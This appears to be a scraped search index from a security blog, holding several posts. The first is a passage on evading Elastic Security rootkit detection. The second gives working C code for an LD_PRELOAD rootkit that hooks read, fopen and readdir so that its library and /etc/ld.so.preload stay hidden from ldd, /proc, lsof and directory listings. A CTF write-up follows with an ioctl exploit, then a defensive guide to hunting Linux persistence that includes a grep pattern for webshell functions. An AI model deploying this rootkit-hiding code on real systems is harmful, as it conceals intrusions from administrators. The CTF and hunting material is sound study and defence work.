employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe 